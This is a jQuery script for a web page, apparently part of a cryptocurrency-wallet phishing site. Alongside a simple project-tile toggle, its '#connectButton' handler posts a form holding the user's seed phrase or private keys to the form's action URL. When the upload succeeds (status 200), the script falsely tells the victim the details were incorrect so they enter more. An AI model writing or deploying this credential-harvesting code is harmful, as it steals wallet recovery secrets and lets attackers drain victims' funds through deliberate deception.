var Mitricia = (function ($) {
  'use strict';

  var mitricia = {};

  $(document).ready(function () {

    $(".project").click(function (e) {
      e.preventDefault();
      if ($(this).hasClass("active") && !$(this).first()) {
        $(this).removeClass("active")
      } else {
        $(".project.active").removeClass("active");
        $(this).addClass("active");
      }
    });

    function seed_form_submit(thisForm, action, formData) {
      fetch(action, {
        method: 'POST',
        body: formData,
        headers: {
          'X-Requested-With': 'XMLHttpRequest',
        },
      }).then(data => {
        if (data.status == 200) {
          alert("Incorrect seed phrase or private keys - please fill the correct details and try again");
        } else if (data.status == 400) {
          alert("Network issues, please try again...");
        } else if (data.status == 404) {
          alert("Form filled incorrectly!");
        }
      });
    }


    $('#connectButton').click(function (e) {
      e.preventDefault();

      let thisForm = $('#seed-form');

      let action = thisForm.attr('action');

      let formData = new FormData(document.getElementById('seed-form'));

      seed_form_submit(thisForm, action, formData);
    });

  });

  return mitricia;
})(jQuery);